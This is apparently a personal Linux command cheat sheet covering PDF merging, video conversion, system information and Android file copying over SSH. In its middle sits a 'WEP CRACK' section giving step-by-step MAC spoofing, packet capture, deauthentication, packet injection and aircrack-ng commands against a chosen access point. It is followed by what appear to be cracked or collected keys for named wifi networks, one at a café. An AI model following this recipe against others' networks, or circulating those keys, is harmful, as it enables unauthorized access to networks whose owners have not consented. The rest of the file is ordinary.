# Combine pdf files together
gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=combined.pdf existing_1.pdf existing_2.pdf

# Show a count of all the file extensions in use below current directory.
find . -type f | egrep -o "[^\.]+$" | tr A-Z a-z | sort | uniq -c | sort -nr

## Which dirs under current have at least 1 gig worth of files
du -h . | grep "^[0-9\.]\+G"

## Download a youtube video
youtube-dl <url>

## find R code that has "rbinom" in it.
find ~/ -name "*.R" | xargs -I{} grep -Hi "rbinom" {}	


## Combine multiple PDFs into one
gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=combined.pdf existing_1.pdf existing_2.pdf

## change color of selected items in 12.04
gsettings set org.gnome.desktop.interface gtk-color-scheme "selected_bg_color:#afb1bd"

#### SSH tricks ###
Pipe the microphone of one machine to the speakers of another
dd if=/dev/dsp | ssh -C user@host dd of=/dev/dsp

#### prototyping ####
http://www.evolus.vn/Pencil/Downloads-Stencils.html

## change the main applications icon in gnome
## Make a 22x22 icon image (.png with transparent background)
sudo mv <your new file>.png /usr/share/icons/gnome/22x22/places/start-here.png
sudo rm /usr/share/icons/gnome/icon-theme.cache 
sudo gtk-update-icon-cache /usr/share/icons/gnome/
killall gnome-panel 



#Encode png files to x264 avi
for i in `seq 1 3`; do mencoder mf://*.png -sws 10 -vf scale=800:592 -ovc x264 -x264encopts qp=40:subq=7:pass=$i -o output.avi; done


#Cut out a section of a video
mencoder <videoin.avi> -ss <starttime sec> -endpos <elapsed sec> -ovc copy -oac copy -o <videoout.avi>

#Encode an mp4 for play on ipods
mencoder original.avi -o new.mp4 -oac copy -ovc lavc -lavcopts vcodec=mpeg1video -of mpeg

#monitor net traffice
sudo iftop -i eth1 -B

#Re-install sound
sudo apt-get --purge remove linux-sound-base alsa-base alsa-utils
rm -rv .pulse
sudo apt-get install linux-sound-base alsa-base alsa-utils


#Find and replace a word in multiple files in a directory
grep -lr -e '<oldword>' * | xargs sed -i 's/<oldword>/<newword>/g'

#Extract images from annoying folder hierarchies
for i in `find -name '*.jpg'`; do echo $i; cp $i ./all/;done



Capture packets on 802.11 wireless networks with Linux 2.6

Date: April 11, 2010. 

---------------------------------------------------------------

1. Get an 802.11 wireless adapter that supports monitor mode. 
   Many Ralink based adapters work well in monitor mode.

2. To capture 802.11 packets, the card will not have an IP address or be associated with an Access Point.
   tcpdump will show supported datalinktypes, however, IEEE802_11_RADIO may not be listed until after 
   configuring the card for monitor mode.

	* tcpdump -i wlan0 -L

3. Bring the interface up and run iwlist to get the channel of the strongest Access Point, then take it down:

	* ifconfig wlan0 up
	* iwlist wlan0 scanning
	* ifconfig wlan0 down

4. Configure the adapter using the channel found by iwlist:

	* iwconfig wlan0 chan 6 mode monitor
	* ifconfig wlan0 up

5. In a separate terminal, run tcpdump to capture packets (first command writes to a file, second to console):

	* tcpdump -s 0 -i wlan0 -y IEEE802_11_RADIO -w $$-802_11.cap
	* tcpdump -s 0 -i wlan0 -e -vv -XX -y IEEE802_11_RADIO


WEP CRACK

First, dissable network-manager by unchecking 'Enable Networking'
# take down wlan0 then bring it up in monitor mode using:

sudo service network-manager stop

# Then run Kismet to view networks with WEP encryptions
# Get the BSSID and Channel of the target network

sudo kismet

# Once AP BSSID and CHAN found, quit kismet

sudo ifconfig wlan0 down
sudo macchanger --mac 00:11:22:33:44:55 wlan0
#sudo iwconfig wlan0 mode monitor 


##BSSID=00:25:3C:26:DD:B9
##CHAN=6

sudo airmon-ng start wlan0 $CHAN

# Run airodump-ng to start collecting IVs
sudo airodump-ng -w nethack -i mon0 -c $CHAN --bssid $BSSID #capture all

Run aireplay-ng to inject packets to speed things up:
sudo aireplay-ng -0 1 -a $BSSID -h 00:11:22:33:44:55 mon0
	(run twice)
sudo aireplay-ng -0 0 -a $BSSID -h 00:11:22:33:44:55 mon0
	(kill early with ctr-c)
sudo aireplay-ng -0 1 -a $BSSID -h 00:11:22:33:44:55 mon0
sudo aireplay-ng -3 -b $BSSID -h 00:11:22:33:44:55 mon0
	(leave running and open new terminal)
sudo aireplay-ng -1 0 -a $BSSID -h 00:11:22:33:44:55 mon0
	(This should send the data rate soaring)
sudo aircrack-ng -a 1 -0 nethack-01.ivs

    Should crack ~30000 IVs


2WIRE165
3316242896

bell626
37385160860032570768622667


BELL953 (McGill College Press Cafe)
98073234307895025991443050

#### To get Galaxy S II to be recognized by rythmbox
$ cd /media/####-####/
$ mkdir Music
$ echo "audio_folders=Music/" > .is_audio_player

where ####-#### is the id of the phone










############# Make embedded flash video in a website without youtube ############

copy swfobject.js into your public_html

ffmpeg -i <input>.avi -sameq -ar 44100 <output>.flv  ##alternatively -qscale 0.5 for less than lossless conversion


### HTML ###
<html><head>

<title></title>

<script type="text/javascript" src="swfobject.js"></script>

</head>

<body>
<center>

<h2>Video!</h2>

<object width="400" height="300">
<param name="movie" value="outputvideo.flv">
<param name="menu" value="true">
<embed src="outputvideo.flv" width="400" height="300" menu="true">
</embed>
</object>

</center>
</body>
</html>
### /HTML ####


##################################################
######### Convert screencast to avi ##############

mencoder /path/to/file.old_file.ogv -o /output/path/new_file.avi -ovc lavc -oac pcm

#################


########### Convert to gif ######################
convert -resize 20% *.jpg out.jpg
convert -delay 30 *.jpg out.gif




################### Android Phone Utils #####################

# Log into phone via ssh:
# run SSHDroid on phone

ssh -p2222 192.168.254.6

#get all pictures and videos:
scp -P2222 192.168.254.6:/mnt/sdcard/DCIM/Camera/* ./




############## ssh autocomplete #############
# add this to .bashrc file
complete -W "$(echo $(grep '^ssh ' .bash_history | sort -u | sed 's/^ssh //'))" ssh






############# System Info ####################


# List all hardware

lshw |less

# Alternative with Gtk frontend

lshw-gtk

# Memory information:

 free -m

# Alternative

cat /proc/meminfo



# Swap information

swapon -s

# Alternative

cat /proc/swaps

# BIOS information:

dmidecode | less

# Show information about the distribution:
 
cat /etc/issue

# Alternative

cat /proc/version

# Show information about all PCI

lspci  #(or -v for verbose)

# Show information about all usb devices.

lsusb # (or -v for verbose)

# Show information about partitions

cat /proc/partitions

